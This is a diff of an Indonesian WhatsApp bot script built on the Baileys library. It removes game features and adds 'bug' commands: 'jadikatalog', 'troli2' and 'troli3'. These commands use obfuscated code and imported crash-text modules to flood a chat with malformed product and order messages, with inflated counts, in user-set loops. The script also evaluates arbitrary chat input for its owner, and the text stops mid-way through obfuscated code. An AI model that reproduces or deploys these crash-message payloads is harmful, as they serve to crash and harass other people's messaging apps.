@@ -1,6 +1,12 @@
 /*
+// Buat Lu Yang Jual Sc Ini Yang Jujur Jangan Sampe Nipu 
+   Apalagi Lari Dari Tanggung Jawab
+
+// Base Haikal Hw Mods : Copyan Dari Base Dika
+
 › Create By Haikal
 › Base Ori Haikal
+› Copyan Base Dika Hisoka Morou
 
 🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA */
 
@@ -9,95 +15,52 @@ require('./hwkal')
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
 const fs = require('fs')
 const util = require('util')
+const os = require('os')
+const mathjs = require('mathjs')
 const chalk = require('chalk')
-const { exec, spawn, execSync } = require("child_process")
 const cl = require('caliph-api') 
 const axios = require('axios')
 const path = require('path')
-const os = require('os')
-const { ngazap } = require('./baseikal/virtex/ngazap')
-const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
-const { buttonkal } = require('./baseikal/virtex/buttonkal')
-const { bugsw } = require('./baseikal/virtex/bugsw')
-const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
-const hx = require('hxz-api')
 const mel = require('kitsune-api')
 const moment = require('moment-timezone')
-const { JSDOM } = require('jsdom')
-const google = require('google-it')
-const mathjs = require('mathjs')
 const speed = require('performance-now')
 const { performance } = require('perf_hooks')
 const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
+const { exec, spawn, execSync } = require("child_process")
+const { virtex, vipi } = require('./baseikal/virtex/virtex.js')
+const { ngazap } = require('./baseikal/virtex/ngazap')
+const { buttonvirus } = require('./baseikal/virtex/buttonvirus')
+const { buttonkal } = require('./baseikal/virtex/buttonkal')
+const { bugsw } = require('./baseikal/virtex/bugsw')
+const { iphone } = require('./baseikal/virtex/iphone')
+const { iphone1 } = require('./baseikal/virtex/iphone1')
+const { iphone2 } = require('./baseikal/virtex/iphone2')
+const { iphone3 } = require('./baseikal/virtex/iphone3')
+const { iphone4 } = require('./baseikal/virtex/iphone4')
+const { iphone5 } = require('./baseikal/virtex/iphone5')
+const { iphone6 } = require('./baseikal/virtex/iphone6')
 const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./baseikal/lib/myfunc')
 const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
 //=================================================//
-const content = JSON.stringify(m.message)
 //=================================================//
-//RPG FUNCTION
-const { 
-addInventoriDarah,cekDuluJoinAdaApaKagaDiJson,addDarah,kurangDarah, getDarah 
-}= require('./src/darah.js')
-const { 
-cekInventoryAdaAtauGak,addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion
-} = require('./src/alat_tukar.js')
-const {addInventoriMonay,cekDuluJoinAdaApaKagaMonaynyaDiJson,addMonay,kurangMonay, getMonay 
-} = require('./src/monay.js')
-const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, getLimit 
-} = require('./src/limit.js')
-const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,addKelinci,addDomba,addSapi, addGajah, kurangIkan, kurangAyam,kurangKelinci,kurangDomba,kurangSapi, kurangGajah, getIkan, getAyam,getKelinci,getDomba,getSapi, getGajah
-} = require('./src/buruan.js')
-let DarahAwal =global.rpg.darahawal
-const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
-const isCekDarah = getDarah(m.sender)
-const isUmpan = getUmpan(m.sender)
-const isPotion = getPotion(m.sender)
-const isIkan = getIkan(m.sender)
-const isAyam = getAyam(m.sender)
-const isKelinci = getKelinci(m.sender)
-const isDomba = getDomba(m.sender)
-const isSapi = getSapi(m.sender)
-const isGajah = getGajah(m.sender)
-const isMonay = getMonay(m.sender)
-const isLimit = getLimit(m.sender)
-const isBesi = getBesi(m.sender)
-const isEmas = getEmas(m.sender)
-const isEmerald = getEmerald(m.sender)
-const isInventory = cekInventoryAdaAtauGak(m.sender)
-const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
-const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
-const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
-const ikan = ['🐟','🐠','🐡']
-//=================================================//
-//rpg database\\
-let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
-let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
-//=================================================//
-// read database
-let tebaklagu = db.data.game.tebaklagu = []
-let _family100 = db.data.game.family100 = []
-let kuismath = db.data.game.math = []
-let tebakgambar = db.data.game.tebakgambar = []
-let tebakkata = db.data.game.tebakkata = []
-let caklontong = db.data.game.lontong = []
-let caklontong_desk = db.data.game.lontong_desk = []
-let tebakkalimat = db.data.game.kalimat = []
-let tebaklirik = db.data.game.lirik = []
-let tebaktebakan = db.data.game.tebakan = []
-let vote = db.data.others.vote = []
 virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
+const content = JSON.stringify(m.message)
+const cerpen = require('./baseikal/lib/cerpen')
 const kalimage = fs.readFileSync ('./baseikal/image/hwmodsgans.jpg')
 const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
 const { mediafireDl } = require('./baseikal/lib/mediafire.js')
 const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
 const ntilink = JSON.parse(fs.readFileSync("./baseikal/lib/antilink.json"))
+const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
+const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
+const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
+const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
+const qtod = m.quoted? "true":"false"
 //=================================================//
-// Function
-const cerpen = require('./baseikal/lib/cerpen')
-wm = 'HW MODS WA'
+let picaks = [flaming,fluming,flarun,flasmurf]
+let picak = picaks[Math.floor(Math.random() * picaks.length)]
 //=================================================//
-// Time & Date
 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
 if(time2 < "23:59:00"){
 var ucapanWaktu = 'Selamat Malam'
@@ -117,17 +80,11 @@ var ucapanWaktu = 'Selamat Pagi'
 if(time2 < "05:00:00"){
 var ucapanWaktu = 'Selamat Malam'
  }
-const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
-const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
-const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
-const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
-const qtod = m.quoted? "true":"false"
-// Date
 moment.tz.setDefault("Asia/Jakarta").locale("id");
 //=================================================//
 module.exports = haikal = async (haikal, m, chatUpdate, store) => {
  try {
- var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
+var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 var budy = (typeof m.text == 'string' ? m.text : '')
 var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
 //=================================================//
@@ -144,8 +101,6 @@ const quoted = m.quoted ? m.quoted : m
 const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
-//=================================================//
-// Group
 const groupMetadata = m.isGroup ? await haikal.groupMetadata(m.chat).catch(e => {}) : ''
 const groupName = m.isGroup ? groupMetadata.subject : ''
 const participants = m.isGroup ? await groupMetadata.participants : ''
@@ -158,18 +113,6 @@ const AntiLink = m.isGroup ? ntilink.includes(from) : false
 const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
 const AntiNsfww = m.isGroup ? ntnsfww.includes(from) : false
 //=================================================//
-// Random Image Simple Menu
-let picaks = [flaming,fluming,flarun,flasmurf]
-let picak = picaks[Math.floor(Math.random() * picaks.length)]
-//document randomizer
-   //randoming function
-function pickRandom(list) {
-return list[Math.floor(list.length * Math.random())]
-}
-let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
-let docs = pickRandom(documents)
-//=================================================//
-//=================================================//
 const doc = { 
 key: {
 fromMe: false, 
@@ -177,25 +120,22 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 },
 "message": {
 "stickerMessage": {
-					"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
-					"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
-					"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
-					"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
-					"mimetype": "image/webp",
-					"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
-					"fileLength": "14240",
-					"mediaKeyTimestamp": "1664991742",
-					"isAnimated": false
+"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
+"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
+"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
+"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
+"mimetype": "image/webp",
+"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
+"fileLength": "14240",
+"mediaKeyTimestamp": "1664991742",
+"isAnimated": false
 }}}
-//=================================================//
 //=================================================//
 const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
 return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
-//=================================================//
-//=================================================//
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -218,22 +158,29 @@ if (!('mute' in chats)) chats.mute = false
 } else global.db.data.chats[m.chat] = {
 mute: false,
 }
+let settings = db.data.settings[botNumber]
+if (typeof settings !== 'object') db.data.settings[botNumber] = {}
+if (settings) {
+if (!('available' in settings)) settings.available = true
+if (!('composing' in settings)) settings.composing = false
+if (!('recording' in settings)) settings.recording = false
+} else db.data.settings[botNumber] = {
+available: true,
+composing: false,
+recording: false,
+}
 } catch (err) {
 console.log(err)
 }
 //=================================================//
-
-// Public & Self
 if (!haikal.public) {
 if (!m.key.fromMe) return
 }
-//console bukan kontol
 if (m.message) {
 console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
-green(budy || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
+green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
  }
 //=================================================// 
-// reset limit every 12 hours
 let cron = require('node-cron')
 cron.schedule('00 12 * * *', () => {
 let user = Object.keys(global.db.data.users)
@@ -272,6 +219,17 @@ haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: g
 var SiGroupadmin = (hehe) => {
 ano = fs.readFileSync('./baseikal/stickernye/SiGroupadmin.webp')
 haikal.sendImageAsSticker(m.chat, ano, m, { packname: global.packname, author: global.author })
+}
+   // autovn
+if(autorecording){
+if(autorecording == false)
+await haikal.sendPresenceUpdate('recording', m.chat)
+} else if(autoketik){
+if(autoketik == false)
+await haikal.sendPresenceUpdate('composing', m.chat)
+} else if(autoavailable){
+if(autoavailable == true)
+await haikal.sendPresenceUpdate('available', m.chat)
 }
 //=================================================//
 // Mute Chat
@@ -315,93 +273,6 @@ type: 'append'
 }
 haikal.ev.emit('messages.upsert', msg)
 }
-if (('family100'+m.chat in _family100) && isCmd) {
-kuis = true
-let room = _family100['family100'+m.chat]
-let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
-let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
-if (!isSurender) {
-let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
-if (room.terjawab[index]) return !0
-room.terjawab[index] = m.sender
-}
-let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
-let caption = `
-Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
-${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
-${Array.from(room.jawaban, (jawaban, index) => {
-return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
-}).filter(v => v).join('\n')}
-${isSurender ? '' : `Perfect Player`}`.trim()
-haikal.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
-if (isWin || isSurender) delete _family100['family100'+m.chat]
-}
-if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaklagu[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebaklagu[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = kuismath[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await m.reply(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
-delete kuismath[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakgambar[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebakgambar[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakkata[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebakkata[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = caklontong[m.sender.split('@')[0]]
-deskripsi = caklontong_desk[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete caklontong[m.sender.split('@')[0]]
-delete caklontong_desk[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakkalimat[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebakkalimat[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaklirik[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebaklirik[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaktebakan[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
-delete tebaktebakan[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
 //=================================================//
 if (budy.startsWith('©️')) {
 if (!isCreator) return
@@ -410,78 +281,6 @@ try {
 return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
 m.reply(e)
-}
-}
-//=================================================//
-//Suit PvP
-this.suit = this.suit ? this.suit : {}
-let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
-if (roof) {
-let win = ''
-let tie = false
-if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
-if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
-haikal.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
-delete this.suit[roof.id]
-return !0
-}
-roof.status = 'play'
-roof.asal = m.chat
-clearTimeout(roof.waktu)
-//delete roof[roof.id].waktu
-haikal.sendText(m.chat, `Suit telah dikirimkan ke chat
-
-@${roof.p.split`@`[0]} dan 
-@${roof.p2.split`@`[0]}
-
-Silahkan pilih suit di chat masing"
-klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-roof.waktu_milih = setTimeout(() => {
-if (!roof.pilih && !roof.pilih2) haikal.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
-else if (!roof.pilih || !roof.pilih2) {
-win = !roof.pilih ? roof.p2 : roof.p
-haikal.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
-}
-delete this.suit[roof.id]
-return !0
-}, roof.timeout)
-}
-let jwb = m.sender == roof.p
-let jwb2 = m.sender == roof.p2
-let g = /gunting/i
-let b = /batu/i
-let k = /kertas/i
-let reg = /^(gunting|batu|kertas)/i
-if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
-roof.pilih = reg.exec(m.text.toLowerCase())[0]
-roof.text = m.text
-m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
-if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
-}
-if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
-roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
-roof.text2 = m.text
-m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
-if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
-}
-let stage = roof.pilih
-let stage2 = roof.pilih2
-if (roof.pilih && roof.pilih2) {
-clearTimeout(roof.waktu_milih)
-if (b.test(stage) && g.test(stage2)) win = roof.p
-else if (b.test(stage) && k.test(stage2)) win = roof.p2
-else if (g.test(stage) && k.test(stage2)) win = roof.p
-else if (g.test(stage) && b.test(stage2)) win = roof.p2
-else if (k.test(stage) && b.test(stage2)) win = roof.p
-else if (k.test(stage) && g.test(stage2)) win = roof.p2
-else if (stage == stage2) tie = true
-haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
-@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
-@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
-`.trim(), m, { mentions: [roof.p, roof.p2] })
-delete this.suit[roof.id]
 }
 }
 //=================================================//
@@ -560,30 +359,51 @@ deploy('sukses sendbug')}
 }
 break
 //=================================================//
-case 'troli2': {
+case 'jadikatalog': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
+if (!quoted) throw 'Reply Image/sticker'
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+}
+}
+break
+//=================================================//
+case 'troli2': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
 var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
-"orderId": "449756950375071",
-"thumbnail":kalimage,
-"itemCount": 7,
+"orderId": "599519108102353",
+"thumbnail": virgam,
+"itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"priceAmount1000": "10000000",
-"message": `© HW MODS WA${ngazap(prefix)}`,
-"orderTitle": `© HW MODS WA${ngazap(prefix)}`,
-"sellerJid": "6285714170944@s.whatsapp.net",
-"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",
-"totalAmount1000": "35000000",
-"totalCurrencyCode": "IDR",
+"message": " BY HW MODS WA ",
+"orderTitle": " BUG TROLI ", // 
+"sellerJid": "6281214281312@s.whatsapp.net",
+"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+}
+break
+case 'troli3': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','HW\x20MODS\x20WA','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt','6281214281312@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const 